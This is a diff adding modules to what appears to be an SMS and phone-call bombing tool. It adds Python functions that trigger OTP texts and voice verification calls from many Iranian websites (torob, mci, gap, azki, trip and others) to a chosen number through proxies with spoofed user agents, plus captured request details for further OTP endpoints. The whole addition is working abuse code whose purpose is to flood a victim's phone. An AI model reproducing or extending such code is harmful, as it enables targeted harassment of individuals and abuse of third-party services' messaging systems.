@@ -1299,6 +1299,111 @@ zabane python:https://github.com/secabuser
         verify=False
     ),
 
+//////////////////////////////////////////////////////////////////////////////
+sms python :https://github.com/jafarm83
+
+@handler.sms_api
+def torob(num, proxies):
+    get(proxies=proxies, url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
+                headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},)
+
+
+https://github.com/jafarm8@handler.sms_api
+def drnext(num, proxies):
+            post(proxies=proxies, url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
+                json={
+                    "source": "besina",
+                    "mobile": f'0{num}'
+                }, )
+
+def mcishop(num, proxies):
+    n4 = {"msisdn":num}
+    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+    post(proxies=proxies, url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------
+call python:https://github.com/jafarm83
+
+@handler.call_api
+def mrbilitcall(num, proxies):
+    get(proxies=proxies, url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{num}',
+    )    
+
+@handler.call_api
+def tezolmarket(num, proxies):
+    persian = get(f"https://api.codebazan.ir/adad/?text={num}").json()
+    get('https://www.tezolmarket.com/Account/Login',
+            f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
+
+@handler.call_api
+def gap(num, proxies):
+    get(proxies=proxies, url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR')
+
+@handler.call_api
+def novinbook(num, proxies):
+    post(proxies=proxies, url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{num}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
+
+@handler.call_api
+def azki(num, proxies):
+    get(proxies=proxies, url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{num}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
+
+@handler.call_api
+def trip(num, proxies):
+    rhead = {"content-type": "application/json;charset=UTF-8","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","accept-language": "fa-IR","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://www.trip.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.trip.ir/","accept-encoding": "gzip, deflate, br","host": "gateway.trip.ir"}
+    #Call&sms
+
+    post(proxies=proxies, url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+num})
+    post(proxies=proxies, url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+num})
+
+@handler.call_api
+def paklean(num, proxies):
+    n4 = {"username": "0"+num}
+    rhead = {"user-agent": generate_user_agent()}
+    post(proxies=proxies, url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
+
+@handler.call_api
+def ragham(num, proxies):
+    n4 = {"phone": "+98"+num}
+    rhead = {"user-agent": generate_user_agent()}
+    post(proxies=proxies, url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ---------------------------------------------------------------------------------------------
 Request URL:
 https://ws.alibaba.ir/api/v3/account/mobile/otp
@@ -1524,6 +1629,102 @@ Referrer Policy:
 strict-origin-when-cross-origin
 
 _rsc: 2h7h9
+---------------------------------------------------------------------------------------------
+1:
+Request URL:
+https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.164.72.189:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+route: extension/websky_otp/module/websky_otp.send_code
+emailsend: 0
+telephone: 09123456456
+
+2:
+Request URL:
+https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.verify_design&telephone=09123456456&emailsend=0
+Request Method:
+GET
+Status Code:
+200 OK
+Remote Address:
+185.164.72.189:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+
+route: extension/websky_otp/module/websky_otp.verify_design
+telephone: 09123456456
+emailsend: 0
+---------------------------------------------------------------------------------------------
+Request URL:
+https://techsiro.com/send-otp
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+185.208.182.237:443
+Referrer Policy:
+no-referrer-when-downgrade
+
+mobile: 09123456456
+client: web
+method: POST
+_token: iltpWHZFZDrK78xWKAGkV7muplA0Sk3DDzqP6fG1
+---------------------------------------------------------------------------------------------
+Request URL:
+https://www.adinehbook.com/gp/flex/sign-in.html
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+94.232.174.244:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+
+path: 
+action: sign
+phone_cell_or_email: 09123456456
+login-submit: تایید
+---------------------------------------------------------------------------------------------
+Request URL:
+https://maxbax.com/bakala/ajax/send_code/
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+46.245.78.154:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+action: bakala_send_code
+phone_email: 09123466456
+
+---------------------------------------------------------------------------------------------
+Request URL:
+https://www.nalinoco.com/api/customers/login-register
+Request Method:
+POST
+Status Code:
+200 OK
+Remote Address:
+31.7.79.68:443
+Referrer Policy:
+strict-origin-when-cross-origin
+
+step: 1
+ReturnUrl: /
+mobile: 09123456456
 ---------------------------------------------------------------------------------------------
 
 
